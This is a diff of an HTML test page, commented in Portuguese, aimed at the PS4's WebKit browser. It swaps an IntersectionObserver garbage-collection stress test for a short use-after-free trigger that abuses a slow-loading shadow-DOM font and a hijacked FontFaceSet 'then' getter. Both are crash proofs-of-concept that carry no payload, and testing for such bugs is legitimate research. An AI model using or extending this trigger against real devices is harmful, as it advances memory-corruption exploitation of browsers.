@@ -1,149 +1,60 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <title>Teste Real IntersectionObserver GC - PS4</title>
-    <style>
-        body { background-color: #121212; color: #00ff66; font-family: monospace; padding: 20px; }
-        h1 { color: #ffffff; font-size: 18px; border-bottom: 2px solid #00ff66; padding-bottom: 10px; }
-        #console { background-color: #000; border: 1px solid #333; padding: 15px; height: 70vh; overflow-y: auto; white-space: pre-wrap; font-size: 13px; }
-        .log { color: #cccccc; }
-        .success { color: #00ff66; font-weight: bold; }
-        .error { color: #ff3333; font-weight: bold; }
-        .info { color: #33ccff; }
-    </style>
-</head>
 <body>
-    <h1>Teste Real WebKit (Commit 9d19688 - IntersectionObserver) - PS4</h1>
-    <div id="console">Iniciando teste de estresse de observadores e GC...</div>
-    <div id="tails" style="display:none;"></div>
+<pre id="log"></pre>
+<script>
+function log(msg) { document.getElementById("log").append(msg + "\n"); }
 
-    <script>
-        var consoleEl = document.getElementById('console');
+document.fonts;
 
-        function log(message, type) {
-            var span = document.createElement('div');
-            span.className = type || 'log';
-            span.textContent = message;
-            consoleEl.appendChild(span);
-            consoleEl.scrollTop = consoleEl.scrollHeight;
+const FONT_URL = "https://slowfil.es/file?type=woff2&delay=120000";
+const FAMILY   = "TestFontA";
+
+window.addEventListener("load", () => setTimeout(() => {
+
+    const host = document.createElement("div");
+    document.body.appendChild(host);
+    const shadow = host.attachShadow({ mode: "open" });
+
+    const style = document.createElement("style");
+    style.textContent =
+        `@font-face { font-family: ${FAMILY}; src: url("${FONT_URL}"); }` +
+        `.p { font: 24px ${FAMILY}; }`;
+    shadow.appendChild(style);
+
+    const span = document.createElement("span");
+    span.className = "p";
+    span.textContent = "A";
+    shadow.appendChild(span);
+
+    document.body.offsetHeight;
+    document.fonts.load(`24px ${FAMILY}`, "A");
+
+    if (document.fonts.status !== "loading") {
+        log("SKIP: fonte nao esta em loading — tente novamente");
+        return;
+    }
+
+    document.fonts.ready;
+
+    // prepend força analyzeStyleSheetChange a escolher Reset
+    const extra = document.createElement("style");
+    extra.textContent = ".unused { color: red; }";
+    shadow.prepend(extra);
+
+    Object.defineProperty(FontFaceSet.prototype, "then", {
+        configurable: true,
+        get() {
+            delete FontFaceSet.prototype.then;
+            host.remove(); // libera o nó que o iterator aponta
+            return undefined;
         }
+    });
 
-        // Constantes globais declaradas com var para evitar bug de TDZ no WebKit antigo do PS4
-        var NFDIV = 512;
-        var NWALK = 4;
-        var NSLICE = 2;
-        var NWAVES = 4;
-        var RIPE_MS = 400;
-        var STEP_MS = 250;
-        var WAVE_MS = 700;
+    // flushPendingDescendantUpdates() ? UAF
+    document.styleSheets.length;
 
-        var tailsBox = document.getElementById("tails");
-        var keep = [];
-        var waves = [];
-        var wavesMade = 0;
-        var lastWave = 0;
+    log("VIVO — sem crash (bug nao presente ou ja corrigido)");
 
-        // Fallback caso o firmware do PS4 nao possua IntersectionObserver nativo
-        var ObserverClass = window.IntersectionObserver || function(cb) {
-            this.targets = [];
-            this.observe = function(el) { this.targets.push(el); el.getBoundingClientRect(); };
-            this.unobserve = function() {};
-            this.disconnect = function() { this.targets = []; };
-        };
-
-        function makeWave() {
-            var frameless = document.implementation.createHTMLDocument("");
-            var divs = new Array(NFDIV);
-            for (var i = 0; i < NFDIV; ++i) {
-                divs[i] = frameless.body.appendChild(frameless.createElement("div"));
-            }
-
-            for (var w = 0; w < NWALK; ++w) {
-                var tail = tailsBox.appendChild(document.createElement("div"));
-                keep.push(tail);
-                var walker = new ObserverClass(function() {});
-                for (var j = NFDIV - 1; j >= 0; --j) {
-                    walker.observe(divs[j]);
-                }
-                walker.observe(tail);
-            }
-
-            var sliceSize = NFDIV / NSLICE;
-            var pins = [];
-            for (var k = 0; k < NSLICE; ++k) {
-                var pin = new ObserverClass(function() {});
-                for (var m = k * sliceSize; m < (k + 1) * sliceSize; ++m) {
-                    pin.observe(divs[m]);
-                }
-                pins.push(pin);
-            }
-            return { pins: pins, born: performance.now(), fired: 0 };
-        }
-
-        function step() {
-            try {
-                var now = performance.now();
-
-                for (var wIdx = 0; wIdx < waves.length; wIdx++) {
-                    var wave = waves[wIdx];
-                    while (wave.fired < NSLICE && (now - wave.born) >= RIPE_MS + wave.fired * STEP_MS) {
-                        var pin = wave.pins[wave.fired++];
-                        var burst = [];
-                        for (var b = 0; b < 50000; ++b) {
-                            burst.push({ x: b, y: [b] });
-                        }
-                        var tail = tailsBox.appendChild(document.createElement("div"));
-                        keep.push(tail);
-                        pin.observe(tail);
-                    }
-                }
-
-                waves = waves.filter(function(wave) { return wave.fired < NSLICE; });
-                if (now - lastWave >= WAVE_MS && wavesMade < NWAVES) {
-                    lastWave = now;
-                    ++wavesMade;
-                    log("Progresso: Onda " + wavesMade + " de " + NWAVES + " gerada.", "info");
-                    waves.push(makeWave());
-                }
-
-                if (!waves.length && wavesMade >= NWAVES) {
-                    log("\nPASS did not crash", "success");
-                    log("SUCESSO: O teste completou o ciclo sem falhas no PS4!", "success");
-                    return;
-                }
-
-                var garbage = [];
-                for (var g = 0; g < 10000; ++g) {
-                    garbage.push({ a: g, b: [g, now] });
-                }
-
-                setTimeout(step, 50);
-            } catch (err) {
-                log("\nERRO NO LOOP: " + err.message, "error");
-                if (err.stack) log(err.stack, "error");
-            }
-        }
-
-        try {
-            log("[Info] Suporte nativo IntersectionObserver: " + (window.IntersectionObserver ? "SIM" : "NAO (Usando getBoundingClientRect fallback)"), "info");
-            log("[Info] Inicializando parametros do teste...", "info");
-
-            waves = [makeWave()];
-            wavesMade = 1;
-            lastWave = performance.now();
-
-            var ballast = [];
-            for (var i = 0; i < 15000; ++i) {
-                ballast.push({ i: i, s: "b" + (i & 1023) });
-            }
-
-            log("[Info] Executando ondas de observadores e pressao de GC...", "info");
-            step();
-        } catch (error) {
-            log("\nERRO NO TESTE: " + error.message, "error");
-            if (error.stack) log(error.stack, "error");
-        }
-    </script>
+}, 0));
+</script>
 </body>
-</html>
